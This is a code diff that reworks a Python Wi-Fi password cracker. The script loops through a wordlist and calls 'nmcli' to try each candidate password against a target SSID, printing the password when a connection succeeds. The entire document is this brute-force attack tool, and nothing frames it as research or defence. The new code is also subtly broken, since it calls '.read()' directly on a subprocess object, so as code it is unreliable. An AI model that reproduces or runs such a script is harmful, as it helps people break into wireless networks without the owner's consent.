@@ -1,5 +1,5 @@
 import sys
-from wireless import Wireless
+import subprocess
 
 def main(SSID=None, Wordlist=None):
     #Some typechecking etc
@@ -20,14 +20,13 @@ def main(SSID=None, Wordlist=None):
     for network_password in dictionary:
         #print(network_password)
         network_password = network_password.rstrip()
-        print(network_password)
-        '''
-        wireless = Wireless()
-        res = wireless.connect(ssid=SSID, password=network_password)
-        if(res):
-            print("Success - Password for " + SSID + " is " + network_password)
+        connect_command = subprocess.Popen(
+            ["nmcli", "device", "wifi", "con", SSID, "password", network_password],
+            stdout=subprocess.PIPE
+            )
+        if("success" in connect_command.read().decode()):
+            print("[!] Success! SSID: " + SSID + " Password: " + network_password)
             return 0
-        '''
     print("Password not in dictionary")
 
 if __name__ == "__main__":
